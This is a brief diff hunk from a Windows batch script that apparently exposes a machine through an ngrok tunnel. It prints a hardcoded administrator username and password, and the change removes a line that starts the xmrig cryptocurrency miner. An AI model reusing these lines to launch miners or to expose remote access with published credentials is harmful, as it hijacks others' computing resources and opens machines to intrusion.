@@ -43,4 +43,3 @@ tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | jq -
 echo User: administrator
 echo Pass: 01217682717Huy
 ping -n 10 10.10.0.10 >nul
-start C:\Users\Public\Desktop\xmrig.exe >nul
